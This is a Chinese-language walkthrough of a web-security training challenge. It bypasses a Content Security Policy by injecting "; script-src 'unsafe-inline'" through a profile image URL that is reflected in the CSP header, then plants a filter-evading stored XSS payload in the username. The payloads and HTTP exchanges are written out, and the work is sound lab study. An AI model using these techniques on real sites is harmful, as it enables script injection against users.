---
title: CSP Bypass
description: CSP 策略允许的 URL 可被设置，实现头部参数注入 unsafe-inline 覆盖原策略。绕过用户名过滤后设置内联 JavaScript。
---

- 描述：Bypass the Content Security Policy and perform an XSS attack with ```<script>alert(`xss`)</script>``` on a legacy page within the application.
- 在用户资料页面设置独特字符串 ```1234567890``` 作为用户名
    出现在
    - 显示当前用户名的 ```<p>``` 文本段 ```\1234567890```
        ```html
        <p style="margin-top: 8%; color: rgb(255, 255, 255); text-align: center; --darkreader-inline-color: var(--darkreader-text-ffffff, #e8e6e3);" data-darkreader-inline-color="">\1234567890</p>
        ```
    - 以及修改用户名的 ```<input>``` 属性值 ```value="1234567890"```
        ```html
        <input class="form-control mdl-textfield__input" id="username" type="text" name="username" value="1234567890" style="color: rgb(255, 255, 255); --darkreader-inline-color: var(--darkreader-text-ffffff, #e8e6e3);" placeholder="e.g. SuperUser" aria-label="Text field for the username" data-darkreader-inline-color="">
        ```
- 尝试进行注入，拥有部分过滤
    - 提交 ```<aaa>``` 编码后为 ```%3Caaa%3E```
        在用户名的 ```<p>``` 文本段中输入作为 HTML 元素，触发储存型 XSS
    - 提交 ```123<aaa>123```
        被过滤为 ```12323```
    - 提交 ```<aaa bbb ccc>```
        被过滤为 ```bb ccc>```
    - 猜测应用程序过滤方式为：将第一个空白字符及其后第一个字符截断
    - 提交 ```<<aaa bbb ccc></aaa>```
        被过滤为 ```<bb ccc></aaa>```
    - 猜测应用程序过滤方式为：删除从其中一个```<```开始，到第一个空白字符后的第一个字符
    - 得到了起始尖括号以及空白符的响应，虽然对过滤方式的探索不完全，但此时足够设计储存型 XSS 攻击向量
        ```<<aaa bscript>alert(`xss`)</script>```
    - 在控制台中得到失败消息
        ```Content-Security-Policy：由于违反下列指令：“script-src 'self' 'unsafe-eval' 页面设置已阻止执行一个内联脚本（script-src-elem）```
    - 查看其 CSP ```GET /profile HTTP/1.1```
        ```Content-Security-Policy: img-src 'self' assets/public/images/uploads/defaultAdmin.png; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com```
- 查看示例解决方案，CSP 对图片的设置 
    ```img-src 'self' assets/public/images/uploads/defaultAdmin.png``` 
    随链接头像图片功能而变化 
    ```POST /profile/image/url HTTP/1.1```
    ```imageUrl=sdfsahgergergvrsgerghb```
    响应头部为
    ```Content-Security-Policy: img-src 'self' sdfsahgergergvrsgerghb; script-src 'self' 'unsafe-eval' https://code.getmdl.io http://ajax.googleapis.com```
    - 头部注入
    - 头像图片链接 url 被 CSP 设置为安全
- 尝试注入
    1. 设置图片链接的头部参数注入 
        ```; script-src 'unsafe-inline'```
    2.  设置名称的攻击向量
        ```<<aaa bscript>alert(`xss`)</script>```